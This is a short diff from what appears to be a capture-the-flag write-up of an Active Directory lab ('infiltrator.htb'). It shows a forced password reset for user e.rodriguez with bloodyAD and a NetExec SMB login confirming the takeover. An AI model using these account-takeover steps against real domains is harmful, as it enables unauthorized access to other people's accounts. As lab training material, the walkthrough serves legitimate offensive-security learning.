@@ -370,7 +370,17 @@ bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -k set password 'e.rodri
 [+] Password changed successfully!
 ```
 
-Now ill change th epas
+Now ill change the password
+
+```python
+nxc smb dc01.infiltrator.htb -u e.rodriguez -p 'Password123!'                                
+SMB         10.129.232.99   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.232.99   445    DC01             [+] infiltrator.htb\e.rodriguez:Password123!
+```
+
+This user is now compromised
+
+
 
 
 
